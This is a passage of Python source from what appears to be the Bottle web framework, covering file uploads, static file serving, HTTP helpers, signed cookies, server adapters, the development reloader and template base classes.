            if not part: return
            yield part


class _closeiter(object):
    """ This only exists to be able to attach a .close method to iterators that
        do not support attribute assignment (most of itertools). """

    def __init__(self, iterator, close=None):
        self.iterator = iterator
        self.close_callbacks = makelist(close)

    def __iter__(self):
        return iter(self.iterator)

    def close(self):
        for func in self.close_callbacks:
            func()


class ResourceManager(object):
    """ This class manages a list of search paths and helps to find and open
        application-bound resources (files).

        :param base: default value for :meth:`add_path` calls.
        :param opener: callable used to open resources.
        :param cachemode: controls which lookups are cached. One of 'all',
                         'found' or 'none'.
    """

    def __init__(self, base='./', opener=open, cachemode='all'):
        self.opener = opener
        self.base = base
        self.cachemode = cachemode

        #: A list of search paths. See :meth:`add_path` for details.
        self.path = []
        #: A cache for resolved paths. ``res.cache.clear()`` clears the cache.
        self.cache = {}

    def add_path(self, path, base=None, index=None, create=False):
        """ Add a new path to the list of search paths. Return False if the
            path does not exist.

            :param path: The new search path. Relative paths are turned into
                an absolute and normalized form. If the path looks like a file
                (not ending in `/`), the filename is stripped off.
            :param base: Path used to absolutize relative search paths.
                Defaults to :attr:`base` which defaults to ``os.getcwd()``.
            :param index: Position within the list of search paths. Defaults
                to last index (appends to the list).

            The `base` parameter makes it easy to reference files installed
            along with a python module or package::

                res.add_path('./resources/', __file__)
        """
        base = os.path.abspath(os.path.dirname(base or self.base))
        path = os.path.abspath(os.path.join(base, os.path.dirname(path)))
        path += os.sep
        if path in self.path:
            self.path.remove(path)
        if create and not os.path.isdir(path):
            os.makedirs(path)
        if index is None:
            self.path.append(path)
        else:
            self.path.insert(index, path)
        self.cache.clear()
        return os.path.exists(path)

    def __iter__(self):
        """ Iterate over all existing files in all registered paths. """
        search = self.path[:]
        while search:
            path = search.pop()
            if not os.path.isdir(path): continue
            for name in os.listdir(path):
                full = os.path.join(path, name)
                if os.path.isdir(full): search.append(full)
                else: yield full

    def lookup(self, name):
        """ Search for a resource and return an absolute file path, or `None`.

            The :attr:`path` list is searched in order. The first match is
            returend. Symlinks are followed. The result is cached to speed up
            future lookups. """
        if name not in self.cache or DEBUG:
            for path in self.path:
                fpath = os.path.join(path, name)
                if os.path.isfile(fpath):
                    if self.cachemode in ('all', 'found'):
                        self.cache[name] = fpath
                    return fpath
            if self.cachemode == 'all':
                self.cache[name] = None
        return self.cache[name]

    def open(self, name, mode='r', *args, **kwargs):
        """ Find a resource and return a file object, or raise IOError. """
        fname = self.lookup(name)
        if not fname: raise IOError("Resource %r not found." % name)
        return self.opener(fname, mode=mode, *args, **kwargs)


class FileUpload(object):

    def __init__(self, fileobj, name, filename, headers=None):
        """ Wrapper for file uploads. """
        #: Open file(-like) object (BytesIO buffer or temporary file)
        self.file = fileobj
        #: Name of the upload form field
        self.name = name
        #: Raw filename as sent by the client (may contain unsafe characters)
        self.raw_filename = filename
        #: A :class:`HeaderDict` with additional headers (e.g. content-type)
        self.headers = HeaderDict(headers) if headers else HeaderDict()

    content_type = HeaderProperty('Content-Type')
    content_length = HeaderProperty('Content-Length', reader=int, default=-1)

    @cached_property
    def filename(self):
        """ Name of the file on the client file system, but normalized to ensure
            file system compatibility. An empty filename is returned as 'empty'.

            Only ASCII letters, digits, dashes, underscores and dots are
            allowed in the final filename. Accents are removed, if possible.
            Whitespace is replaced by a single dash. Leading or tailing dots
            or dashes are removed. The filename is limited to 255 characters.
        """
        fname = self.raw_filename
        if not isinstance(fname, unicode):
            fname = fname.decode('utf8', 'ignore')
        fname = normalize('NFKD', fname).encode('ASCII', 'ignore').decode('ASCII')
        fname = os.path.basename(fname.replace('\\', os.path.sep))
        fname = re.sub(r'[^a-zA-Z0-9-_.\s]', '', fname).strip()
        fname = re.sub(r'[-\s]+', '-', fname).strip('.-')
        return fname[:255] or 'empty'

    def _copy_file(self, fp, chunk_size=2**16):
        read, write, offset = self.file.read, fp.write, self.file.tell()
        while 1:
            buf = read(chunk_size)
            if not buf: break
            write(buf)
        self.file.seek(offset)

    def save(self, destination, overwrite=False, chunk_size=2**16):
        """ Save file to disk or copy its content to an open file(-like) object.
            If *destination* is a directory, :attr:`filename` is added to the
            path. Existing files are not overwritten by default (IOError).

            :param destination: File path, directory or file(-like) object.
            :param overwrite: If True, replace existing files. (default: False)
            :param chunk_size: Bytes to read at a time. (default: 64kb)
        """
        if isinstance(destination, basestring): # Except file-likes here
            if os.path.isdir(destination):
                destination = os.path.join(destination, self.filename)
            if not overwrite and os.path.exists(destination):
                raise IOError('File exists.')
            with open(destination, 'wb') as fp:
                self._copy_file(fp, chunk_size)
        else:
            self._copy_file(destination, chunk_size)






###############################################################################
# Application Helper ###########################################################
###############################################################################


def abort(code=500, text='Unknown Error.'):
    """ Aborts execution and causes a HTTP error. """
    raise HTTPError(code, text)


def redirect(url, code=None):
    """ Aborts execution and causes a 303 or 302 redirect, depending on
        the HTTP protocol version. """
    if not code:
        code = 303 if request.get('SERVER_PROTOCOL') == "HTTP/1.1" else 302
    res = response.copy(cls=HTTPResponse)
    res.status = code
    res.body = ""
    res.set_header('Location', urljoin(request.url, url))
    raise res


def _file_iter_range(fp, offset, bytes, maxread=1024*1024):
    """ Yield chunks from a range in a file. No chunk is bigger than maxread."""
    fp.seek(offset)
    while bytes > 0:
        part = fp.read(min(bytes, maxread))
        if not part: break
        bytes -= len(part)
        yield part


def static_file(filename, root, mimetype='auto', download=False, charset='UTF-8'):
    """ Open a file in a safe way and return :exc:`HTTPResponse` with status
        code 200, 305, 403 or 404. The ``Content-Type``, ``Content-Encoding``,
        ``Content-Length`` and ``Last-Modified`` headers are set if possible.
        Special support for ``If-Modified-Since``, ``Range`` and ``HEAD``
        requests.

        :param filename: Name or path of the file to send.
        :param root: Root path for file lookups. Should be an absolute directory
            path.
        :param mimetype: Defines the content-type header (default: guess from
            file extension)
        :param download: If True, ask the browser to open a `Save as...` dialog
            instead of opening the file with the associated program. You can
            specify a custom filename as a string. If not specified, the
            original filename is used (default: False).
        :param charset: The charset to use for files with a ``text/*``
            mime-type. (default: UTF-8)
    """

    root = os.path.abspath(root) + os.sep
    filename = os.path.abspath(os.path.join(root, filename.strip('/\\')))
    headers = dict()

    if not filename.startswith(root):
        return HTTPError(403, "Access denied.")
    if not os.path.exists(filename) or not os.path.isfile(filename):
        return HTTPError(404, "File does not exist.")
    if not os.access(filename, os.R_OK):
        return HTTPError(403, "You do not have permission to access this file.")

    if mimetype == 'auto':
        if download and download != True:
            mimetype, encoding = mimetypes.guess_type(download)
        else:
            mimetype, encoding = mimetypes.guess_type(filename)
        if encoding: headers['Content-Encoding'] = encoding

    if mimetype:
        if mimetype[:5] == 'text/' and charset and 'charset' not in mimetype:
            mimetype += '; charset=%s' % charset
        headers['Content-Type'] = mimetype

    if download:
        download = os.path.basename(filename if download == True else download)
        headers['Content-Disposition'] = 'attachment; filename="%s"' % download

    stats = os.stat(filename)
    headers['Content-Length'] = clen = stats.st_size
    lm = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime(stats.st_mtime))
    headers['Last-Modified'] = lm

    ims = request.environ.get('HTTP_IF_MODIFIED_SINCE')
    if ims:
        ims = parse_date(ims.split(";")[0].strip())
    if ims is not None and ims >= int(stats.st_mtime):
        headers['Date'] = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
        return HTTPResponse(status=304, **headers)

    body = '' if request.method == 'HEAD' else open(filename, 'rb')

    headers["Accept-Ranges"] = "bytes"
    ranges = request.environ.get('HTTP_RANGE')
    if 'HTTP_RANGE' in request.environ:
        ranges = list(parse_range_header(request.environ['HTTP_RANGE'], clen))
        if not ranges:
            return HTTPError(416, "Requested Range Not Satisfiable")
        offset, end = ranges[0]
        headers["Content-Range"] = "bytes %d-%d/%d" % (offset, end-1, clen)
        headers["Content-Length"] = str(end-offset)
        if body: body = _file_iter_range(body, offset, end-offset)
        return HTTPResponse(body, status=206, **headers)
    return HTTPResponse(body, **headers)






###############################################################################
# HTTP Utilities and MISC (TODO) ###############################################
###############################################################################


def debug(mode=True):
    """ Change the debug level.
    There is only one debug level supported at the moment."""
    global DEBUG
    if mode: warnings.simplefilter('default')
    DEBUG = bool(mode)

def http_date(value):
    if isinstance(value, (datedate, datetime)):
        value = value.utctimetuple()
    elif isinstance(value, (int, float)):
        value = time.gmtime(value)
    if not isinstance(value, basestring):
        value = time.strftime("%a, %d %b %Y %H:%M:%S GMT", value)
    return value

def parse_date(ims):
    """ Parse rfc1123, rfc850 and asctime timestamps and return UTC epoch. """
    try:
        ts = email.utils.parsedate_tz(ims)
        return time.mktime(ts[:8] + (0,)) - (ts[9] or 0) - time.timezone
    except (TypeError, ValueError, IndexError, OverflowError):
        return None

def parse_auth(header):
    """ Parse rfc2617 HTTP authentication header string (basic) and return (user,pass) tuple or None"""
    try:
        method, data = header.split(None, 1)
        if method.lower() == 'basic':
            user, pwd = touni(base64.b64decode(tob(data))).split(':',1)
            return user, pwd
    except (KeyError, ValueError):
        return None

def parse_range_header(header, maxlen=0):
    """ Yield (start, end) ranges parsed from a HTTP Range header. Skip
        unsatisfiable ranges. The end index is non-inclusive."""
    if not header or header[:6] != 'bytes=': return
    ranges = [r.split('-', 1) for r in header[6:].split(',') if '-' in r]
    for start, end in ranges:
        try:
            if not start:  # bytes=-100    -> last 100 bytes
                start, end = max(0, maxlen-int(end)), maxlen
            elif not end:  # bytes=100-    -> all but the first 99 bytes
                start, end = int(start), maxlen
            else:          # bytes=100-200 -> bytes 100-200 (inclusive)
                start, end = int(start), min(int(end)+1, maxlen)
            if 0 <= start < end <= maxlen:
                yield start, end
        except ValueError:
            pass

def _parse_qsl(qs):
    r = []
    for pair in qs.replace(';','&').split('&'):
        if not pair: continue
        nv = pair.split('=', 1)
        if len(nv) != 2: nv.append('')
        key = urlunquote(nv[0].replace('+', ' '))
        value = urlunquote(nv[1].replace('+', ' '))
        r.append((key, value))
    return r

def _lscmp(a, b):
    """ Compares two strings in a cryptographically safe way:
        Runtime is not affected by length of common prefix. """
    return not sum(0 if x==y else 1 for x, y in zip(a, b)) and len(a) == len(b)


def cookie_encode(data, key):
    """ Encode and sign a pickle-able object. Return a (byte) string """
    msg = base64.b64encode(pickle.dumps(data, -1))
    sig = base64.b64encode(hmac.new(tob(key), msg).digest())
    return tob('!') + sig + tob('?') + msg


def cookie_decode(data, key):
    """ Verify and decode an encoded string. Return an object or None."""
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None


def cookie_is_encoded(data):
    """ Return True if the argument looks like a encoded cookie."""
    return bool(data.startswith(tob('!')) and tob('?') in data)


def html_escape(string):
    """ Escape HTML special characters ``&<>`` and quotes ``'"``. """
    return string.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')\
                 .replace('"','&quot;').replace("'",'&#039;')


def html_quote(string):
    """ Escape and quote a string to be used as an HTTP attribute."""
    return '"%s"' % html_escape(string).replace('\n','&#10;')\
                    .replace('\r','&#13;').replace('\t','&#9;')


def yieldroutes(func):
    """ Return a generator for routes that match the signature (name, args)
    of the func parameter. This may yield more than one route if the function
    takes optional keyword arguments. The output is best described by example::

        a()         -> '/a'
        b(x, y)     -> '/b/<x>/<y>'
        c(x, y=5)   -> '/c/<x>' and '/c/<x>/<y>'
        d(x=5, y=6) -> '/d' and '/d/<x>' and '/d/<x>/<y>'
    """
    path = '/' + func.__name__.replace('__','/').lstrip('/')
    spec = getargspec(func)
    argc = len(spec[0]) - len(spec[3] or [])
    path += ('/<%s>' * argc) % tuple(spec[0][:argc])
    yield path
    for arg in spec[0][argc:]:
        path += '/<%s>' % arg
        yield path


def path_shift(script_name, path_info, shift=1):
    """ Shift path fragments from PATH_INFO to SCRIPT_NAME and vice versa.

        :return: The modified paths.
        :param script_name: The SCRIPT_NAME path.
        :param script_name: The PATH_INFO path.
        :param shift: The number of path fragments to shift. May be negative to
          change the shift direction. (default: 1)
    """
    if shift == 0: return script_name, path_info
    pathlist = path_info.strip('/').split('/')
    scriptlist = script_name.strip('/').split('/')
    if pathlist and pathlist[0] == '': pathlist = []
    if scriptlist and scriptlist[0] == '': scriptlist = []
    if 0 < shift <= len(pathlist):
        moved = pathlist[:shift]
        scriptlist = scriptlist + moved
        pathlist = pathlist[shift:]
    elif 0 > shift >= -len(scriptlist):
        moved = scriptlist[shift:]
        pathlist = moved + pathlist
        scriptlist = scriptlist[:shift]
    else:
        empty = 'SCRIPT_NAME' if shift < 0 else 'PATH_INFO'
        raise AssertionError("Cannot shift. Nothing left from %s" % empty)
    new_script_name = '/' + '/'.join(scriptlist)
    new_path_info = '/' + '/'.join(pathlist)
    if path_info.endswith('/') and pathlist: new_path_info += '/'
    return new_script_name, new_path_info


def auth_basic(check, realm="private", text="Access denied"):
    """ Callback decorator to require HTTP auth (basic).
        TODO: Add route(check_auth=...) parameter. """
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*a, **ka):
            user, password = request.auth or (None, None)
            if user is None or not check(user, password):
                err = HTTPError(401, text)
                err.add_header('WWW-Authenticate', 'Basic realm="%s"' % realm)
                return err
            return func(*a, **ka)
        return wrapper
    return decorator


# Shortcuts for common Bottle methods.
# They all refer to the current default application.

def make_default_app_wrapper(name):
    """ Return a callable that relays calls to the current default app. """
    @functools.wraps(getattr(Bottle, name))
    def wrapper(*a, **ka):
        return getattr(app(), name)(*a, **ka)
    return wrapper

route     = make_default_app_wrapper('route')
get       = make_default_app_wrapper('get')
post      = make_default_app_wrapper('post')
put       = make_default_app_wrapper('put')
delete    = make_default_app_wrapper('delete')
patch     = make_default_app_wrapper('patch')
error     = make_default_app_wrapper('error')
mount     = make_default_app_wrapper('mount')
hook      = make_default_app_wrapper('hook')
install   = make_default_app_wrapper('install')
uninstall = make_default_app_wrapper('uninstall')
url       = make_default_app_wrapper('get_url')







###############################################################################
# Server Adapter ###############################################################
###############################################################################


class ServerAdapter(object):
    quiet = False
    def __init__(self, host='127.0.0.1', port=8080, **options):
        self.options = options
        self.host = host
        self.port = int(port)

    def run(self, handler): # pragma: no cover
        pass

    def __repr__(self):
        args = ', '.join(['%s=%s'%(k,repr(v)) for k, v in self.options.items()])
        return "%s(%s)" % (self.__class__.__name__, args)


class CGIServer(ServerAdapter):
    quiet = True
    def run(self, handler): # pragma: no cover
        from wsgiref.handlers import CGIHandler
        def fixed_environ(environ, start_response):
            environ.setdefault('PATH_INFO', '')
            return handler(environ, start_response)
        CGIHandler().run(fixed_environ)


class FlupFCGIServer(ServerAdapter):
    def run(self, handler): # pragma: no cover
        import flup.server.fcgi
        self.options.setdefault('bindAddress', (self.host, self.port))
        flup.server.fcgi.WSGIServer(handler, **self.options).run()


class WSGIRefServer(ServerAdapter):

    def run(self, app): # pragma: no cover
        from wsgiref.simple_server import make_server
        from wsgiref.simple_server import WSGIRequestHandler, WSGIServer
        import socket

        class FixedHandler(WSGIRequestHandler):
            def address_string(self): # Prevent reverse DNS lookups please.
                return self.client_address[0]
            def log_request(*args, **kw):
                if not self.quiet:
                    return WSGIRequestHandler.log_request(*args, **kw)

        handler_cls = self.options.get('handler_class', FixedHandler)
        server_cls  = self.options.get('server_class', WSGIServer)

        if ':' in self.host: # Fix wsgiref for IPv6 addresses.
            if getattr(server_cls, 'address_family') == socket.AF_INET:
                class server_cls(server_cls):
                    address_family = socket.AF_INET6

        self.srv = make_server(self.host, self.port, app, server_cls, handler_cls)
        self.port = self.srv.server_port # update port actual port (0 means random)
        try:
            self.srv.serve_forever()
        except KeyboardInterrupt:
            self.srv.server_close() # Prevent ResourceWarning: unclosed socket
            raise


class CherryPyServer(ServerAdapter):
    def run(self, handler): # pragma: no cover
        from cherrypy import wsgiserver
        self.options['bind_addr'] = (self.host, self.port)
        self.options['wsgi_app'] = handler
        
        certfile = self.options.get('certfile')
        if certfile:
            del self.options['certfile']
        keyfile = self.options.get('keyfile')
        if keyfile:
            del self.options['keyfile']
        
        server = wsgiserver.CherryPyWSGIServer(**self.options)
        if certfile:
            server.ssl_certificate = certfile
        if keyfile:
            server.ssl_private_key = keyfile
        
        try:
            server.start()
        finally:
            server.stop()


class WaitressServer(ServerAdapter):
    def run(self, handler):
        from waitress import serve
        serve(handler, host=self.host, port=self.port, _quiet=self.quiet)


class PasteServer(ServerAdapter):
    def run(self, handler): # pragma: no cover
        from paste import httpserver
        from paste.translogger import TransLogger
        handler = TransLogger(handler, setup_console_handler=(not self.quiet))
        httpserver.serve(handler, host=self.host, port=str(self.port),
                         **self.options)


class MeinheldServer(ServerAdapter):
    def run(self, handler):
        from meinheld import server
        server.listen((self.host, self.port))
        server.run(handler)


class FapwsServer(ServerAdapter):
    """ Extremely fast webserver using libev. See http://www.fapws.org/ """
    def run(self, handler): # pragma: no cover
        import fapws._evwsgi as evwsgi
        from fapws import base, config
        port = self.port
        if float(config.SERVER_IDENT[-2:]) > 0.4:
            # fapws3 silently changed its API in 0.5
            port = str(port)
        evwsgi.start(self.host, port)
        # fapws3 never releases the GIL. Complain upstream. I tried. No luck.
        if 'BOTTLE_CHILD' in os.environ and not self.quiet:
            _stderr("WARNING: Auto-reloading does not work with Fapws3.\n")
            _stderr("         (Fapws3 breaks python thread support)\n")
        evwsgi.set_base_module(base)
        def app(environ, start_response):
            environ['wsgi.multiprocess'] = False
            return handler(environ, start_response)
        evwsgi.wsgi_cb(('', app))
        evwsgi.run()


class TornadoServer(ServerAdapter):
    """ The super hyped asynchronous server by facebook. Untested. """
    def run(self, handler): # pragma: no cover
        import tornado.wsgi, tornado.httpserver, tornado.ioloop
        container = tornado.wsgi.WSGIContainer(handler)
        server = tornado.httpserver.HTTPServer(container)
        server.listen(port=self.port,address=self.host)
        tornado.ioloop.IOLoop.instance().start()


class AppEngineServer(ServerAdapter):
    """ Adapter for Google App Engine. """
    quiet = True
    def run(self, handler):
        from google.appengine.ext.webapp import util
        # A main() function in the handler script enables 'App Caching'.
        # Lets makes sure it is there. This _really_ improves performance.
        module = sys.modules.get('__main__')
        if module and not hasattr(module, 'main'):
            module.main = lambda: util.run_wsgi_app(handler)
        util.run_wsgi_app(handler)


class TwistedServer(ServerAdapter):
    """ Untested. """
    def run(self, handler):
        from twisted.web import server, wsgi
        from twisted.python.threadpool import ThreadPool
        from twisted.internet import reactor
        thread_pool = ThreadPool()
        thread_pool.start()
        reactor.addSystemEventTrigger('after', 'shutdown', thread_pool.stop)
        factory = server.Site(wsgi.WSGIResource(reactor, thread_pool, handler))
        reactor.listenTCP(self.port, factory, interface=self.host)
        if not reactor.running:
            reactor.run()


class DieselServer(ServerAdapter):
    """ Untested. """
    def run(self, handler):
        from diesel.protocols.wsgi import WSGIApplication
        app = WSGIApplication(handler, port=self.port)
        app.run()


class GeventServer(ServerAdapter):
    """ Untested. Options:

        * `fast` (default: False) uses libevent's http server, but has some
          issues: No streaming, no pipelining, no SSL.
        * See gevent.wsgi.WSGIServer() documentation for more options.
    """
    def run(self, handler):
        from gevent import wsgi, pywsgi, local
        if not isinstance(threading.local(), local.local):
            msg = "Bottle requires gevent.monkey.patch_all() (before import)"
            raise RuntimeError(msg)
        if not self.options.pop('fast', None): wsgi = pywsgi
        self.options['log'] = None if self.quiet else 'default'
        address = (self.host, self.port)
        server = wsgi.WSGIServer(address, handler, **self.options)
        if 'BOTTLE_CHILD' in os.environ:
            import signal
            signal.signal(signal.SIGINT, lambda s, f: server.stop())
        server.serve_forever()


class GeventSocketIOServer(ServerAdapter):
    def run(self,handler):
        from socketio import server
        address = (self.host, self.port)
        server.SocketIOServer(address, handler, **self.options).serve_forever()


class GunicornServer(ServerAdapter):
    """ Untested. See http://gunicorn.org/configure.html for options. """
    def run(self, handler):
        from gunicorn.app.base import Application

        config = {'bind': "%s:%d" % (self.host, int(self.port))}
        config.update(self.options)

        class GunicornApplication(Application):
            def init(self, parser, opts, args):
                return config

            def load(self):
                return handler

        GunicornApplication().run()


class EventletServer(ServerAdapter):
    """ Untested. Options:

        * `backlog` adjust the eventlet backlog parameter which is the maximum
          number of queued connections. Should be at least 1; the maximum
          value is system-dependent.
        * `family`: (default is 2) socket family, optional. See socket
          documentation for available families.
    """
    def run(self, handler):
        from eventlet import wsgi, listen, patcher
        if not patcher.is_monkey_patched(os):
            msg = "Bottle requires eventlet.monkey_patch() (before import)"
            raise RuntimeError(msg)
        socket_args = {}
        for arg in ('backlog', 'family'):
            try:
                socket_args[arg] = self.options.pop(arg)
            except KeyError:
                pass
        address = (self.host, self.port)
        try:
            wsgi.server(listen(address, **socket_args), handler,
                        log_output=(not self.quiet))
        except TypeError:
            # Fallback, if we have old version of eventlet
            wsgi.server(listen(address), handler)


class RocketServer(ServerAdapter):
    """ Untested. """
    def run(self, handler):
        from rocket import Rocket
        server = Rocket((self.host, self.port), 'wsgi', { 'wsgi_app' : handler })
        server.start()


class BjoernServer(ServerAdapter):
    """ Fast server written in C: https://github.com/jonashaag/bjoern """
    def run(self, handler):
        from bjoern import run
        run(handler, self.host, self.port)


class AutoServer(ServerAdapter):
    """ Untested. """
    adapters = [WaitressServer, PasteServer, TwistedServer, CherryPyServer, WSGIRefServer]
    def run(self, handler):
        for sa in self.adapters:
            try:
                return sa(self.host, self.port, **self.options).run(handler)
            except ImportError:
                pass

server_names = {
    'cgi': CGIServer,
    'flup': FlupFCGIServer,
    'wsgiref': WSGIRefServer,
    'waitress': WaitressServer,
    'cherrypy': CherryPyServer,
    'paste': PasteServer,
    'fapws3': FapwsServer,
    'tornado': TornadoServer,
    'gae': AppEngineServer,
    'twisted': TwistedServer,
    'diesel': DieselServer,
    'meinheld': MeinheldServer,
    'gunicorn': GunicornServer,
    'eventlet': EventletServer,
    'gevent': GeventServer,
    'geventSocketIO':GeventSocketIOServer,
    'rocket': RocketServer,
    'bjoern' : BjoernServer,
    'auto': AutoServer,
}






###############################################################################
# Application Control ##########################################################
###############################################################################


def load(target, **namespace):
    """ Import a module or fetch an object from a module.

        * ``package.module`` returns `module` as a module object.
        * ``pack.mod:name`` returns the module variable `name` from `pack.mod`.
        * ``pack.mod:func()`` calls `pack.mod.func()` and returns the result.

        The last form accepts not only function calls, but any type of
        expression. Keyword arguments passed to this function are available as
        local variables. Example: ``import_string('re:compile(x)', x='[a-z]')``
    """
    module, target = target.split(":", 1) if ':' in target else (target, None)
    if module not in sys.modules: __import__(module)
    if not target: return sys.modules[module]
    if target.isalnum(): return getattr(sys.modules[module], target)
    package_name = module.split('.')[0]
    namespace[package_name] = sys.modules[package_name]
    return eval('%s.%s' % (module, target), namespace)


def load_app(target):
    """ Load a bottle application from a module and make sure that the import
        does not affect the current default application, but returns a separate
        application object. See :func:`load` for the target parameter. """
    global NORUN; NORUN, nr_old = True, NORUN
    tmp = default_app.push() # Create a new "default application"
    try:
        rv = load(target) # Import the target module
        return rv if callable(rv) else tmp
    finally:
        default_app.remove(tmp) # Remove the temporary added default application
        NORUN = nr_old

_debug = debug
def run(app=None, server='wsgiref', host='127.0.0.1', port=8080,
        interval=1, reloader=False, quiet=False, plugins=None,
        debug=None, **kargs):
    """ Start a server instance. This method blocks until the server terminates.

        :param app: WSGI application or target string supported by
               :func:`load_app`. (default: :func:`default_app`)
        :param server: Server adapter to use. See :data:`server_names` keys
               for valid names or pass a :class:`ServerAdapter` subclass.
               (default: `wsgiref`)
        :param host: Server address to bind to. Pass ``0.0.0.0`` to listens on
               all interfaces including the external one. (default: 127.0.0.1)
        :param port: Server port to bind to. Values below 1024 require root
               privileges. (default: 8080)
        :param reloader: Start auto-reloading server? (default: False)
        :param interval: Auto-reloader interval in seconds (default: 1)
        :param quiet: Suppress output to stdout and stderr? (default: False)
        :param options: Options passed to the server adapter.
     """
    if NORUN: return
    if reloader and not os.environ.get('BOTTLE_CHILD'):
        lockfile = None
        try:
            fd, lockfile = tempfile.mkstemp(prefix='bottle.', suffix='.lock')
            os.close(fd) # We only need this file to exist. We never write to it
            while os.path.exists(lockfile):
                args = [sys.executable] + sys.argv
                environ = os.environ.copy()
                environ['BOTTLE_CHILD'] = 'true'
                environ['BOTTLE_LOCKFILE'] = lockfile
                p = subprocess.Popen(args, env=environ)
                while p.poll() is None: # Busy wait...
                    os.utime(lockfile, None) # I am alive!
                    time.sleep(interval)
                if p.poll() != 3:
                    if os.path.exists(lockfile): os.unlink(lockfile)
                    sys.exit(p.poll())
        except KeyboardInterrupt:
            pass
        finally:
            if os.path.exists(lockfile):
                os.unlink(lockfile)
        return

    try:
        if debug is not None: _debug(debug)
        app = app or default_app()
        if isinstance(app, basestring):
            app = load_app(app)
        if not callable(app):
            raise ValueError("Application is not callable: %r" % app)

        for plugin in plugins or []:
            if isinstance(plugin, basestring):
                plugin = load(plugin)
            app.install(plugin)

        if server in server_names:
            server = server_names.get(server)
        if isinstance(server, basestring):
            server = load(server)
        if isinstance(server, type):
            server = server(host=host, port=port, **kargs)
        if not isinstance(server, ServerAdapter):
            raise ValueError("Unknown or unsupported server: %r" % server)

        server.quiet = server.quiet or quiet
        if not server.quiet:
            _stderr("Bottle v%s server starting up (using %s)...\n" % (__version__, repr(server)))
            _stderr("Listening on http://%s:%d/\n" % (server.host, server.port))
            _stderr("Hit Ctrl-C to quit.\n\n")

        if reloader:
            lockfile = os.environ.get('BOTTLE_LOCKFILE')
            bgcheck = FileCheckerThread(lockfile, interval)
            with bgcheck:
                server.run(app)
            if bgcheck.status == 'reload':
                sys.exit(3)
        else:
            server.run(app)
    except KeyboardInterrupt:
        pass
    except (SystemExit, MemoryError):
        raise
    except:
        if not reloader: raise
        if not getattr(server, 'quiet', quiet):
            print_exc()
        time.sleep(interval)
        sys.exit(3)



class FileCheckerThread(threading.Thread):
    """ Interrupt main-thread as soon as a changed module file is detected,
        the lockfile gets deleted or gets to old. """

    def __init__(self, lockfile, interval):
        threading.Thread.__init__(self)
        self.daemon = True
        self.lockfile, self.interval = lockfile, interval
        #: Is one of 'reload', 'error' or 'exit'
        self.status = None

    def run(self):
        exists = os.path.exists
        mtime = lambda p: os.stat(p).st_mtime
        files = dict()

        for module in list(sys.modules.values()):
            path = getattr(module, '__file__', '')
            if path[-4:] in ('.pyo', '.pyc'): path = path[:-1]
            if path and exists(path): files[path] = mtime(path)

        while not self.status:
            if not exists(self.lockfile)\
            or mtime(self.lockfile) < time.time() - self.interval - 5:
                self.status = 'error'
                thread.interrupt_main()
            for path, lmtime in list(files.items()):
                if not exists(path) or mtime(path) > lmtime:
                    self.status = 'reload'
                    thread.interrupt_main()
                    break
            time.sleep(self.interval)

    def __enter__(self):
        self.start()

    def __exit__(self, exc_type, *_):
        if not self.status: self.status = 'exit' # silent exit
        self.join()
        return exc_type is not None and issubclass(exc_type, KeyboardInterrupt)





###############################################################################
# Template Adapters ############################################################
###############################################################################


class TemplateError(HTTPError):
    def __init__(self, message):
        HTTPError.__init__(self, 500, message)


class BaseTemplate(object):
    """ Base class and minimal API for template adapters """
    extensions = ['tpl','html','thtml','stpl']
    settings = {} #used in prepare()
    defaults = {} #used in render()

    def __init__(self, source=None, name=None, lookup=None, encoding='utf8', **settings):
        """ Create a new template.
        If the source parameter (str or buffer) is missing, the name argument
        is used to guess a template filename. Subclasses can assume that
        self.source and/or self.filename are set. Both are strings.
        The lookup, encoding and settings parameters are stored as instance
        variables.
        The lookup parameter stores a list containing directory paths.
        The encoding parameter should be used to decode byte strings or files.
        The settings parameter contains a dict for engine-specific settings.
        """
        self.name = name
        self.source = source.read() if hasattr(source, 'read') else source
        self.filename = source.filename if hasattr(source, 'filename') else None
        self.lookup = [os.path.abspath(x) for x in lookup] if lookup else []
        self.encoding = encoding
        self.settings = self.settings.copy() # Copy from class variable
        self.settings.update(settings) # Apply
        if not self.source and self.name:
            self.filename = self.search(self.name, self.lookup)
            if not self.filename:
                raise TemplateError('Template %s not found.' % repr(name))
        if not self.source and not self.filename:
            raise TemplateError('No template specified.')
        self.prepare(**self.settings)

    @classmethod
    def search(cls, name, lookup=None):
        """ Search name in all directories specified in lookup.
        First without, then with common extensions. Return first hit. """
        if not lookup:
            depr('The template lookup path list should not be empty.', True) #0.12
            lookup = ['.']

        if os.path.isabs(name) and os.path.isfile(name):
            depr('Absolute template path names are deprecated.', True) #0.12
            return os.path.abspath(name)

        for spath in lookup:
            spath = os.path.abspath(spath) + os.sep
            fname = os.path.abspath(os.path.join(spath, name))
            if not fname.startswith(spath): continue
            if os.path.isfile(fname): return fname
            for ext in cls.extensions:
                if os.path.isfile('%s.%s' % (fname, ext)):
                    return '%s.%s' % (fname, ext)

    @classmethod
    def global_config(cls, key, *args):
        """ This reads or sets the global settings stored in class.settings. """
        if args:
            cls.settings = cls.settings.copy() # Make settings local to class
            cls.settings[key] = args[0]
        else:
            return cls.settings[key]

    def prepare(self, **options):
        """ Run preparations (parsing, caching, ...).
        It should be possible to call this again to refresh a template or to
        update settings.
        """
        raise NotImplementedError

    def render(self, *args, **kwargs):
        """ Render the template with the specified local variables and return
        a single byte or unicode string. If it is a byte string, the encoding
        must match self.encoding. This method must be thread-safe!
        Local variables may be provided in dictionaries (args)
        or directly, as keywords (kwargs).
        """
        raise NotImplementedError


class MakoTemplate(BaseTemplate):
    def prepare(self, **options):
        from mako.template import Template
        from mako.lookup import TemplateLookup
        options.update({'input_encoding':self.encoding})
        options.setdefault('format_exceptions', bool(DEBUG))
        lookup = TemplateLookup(directories=self.lookup, **options)
        if self.source:
            self.tpl = Template(self.source, lookup=lookup, **options)
        else:
            self.tpl = Template(uri=self.name, filename=self.filename, lookup=lookup, **options)

    def render(self, *args, **kwargs):
        for dictarg in args: kwargs.update(dictarg)
        _defaults = self.defaults.copy()
        _defaults.update(kwargs)
        return self.tpl.render(**_defaults)


class CheetahTemplate(BaseTemplate):
    def prepare(self, **options):
        from Cheetah.Template import Template
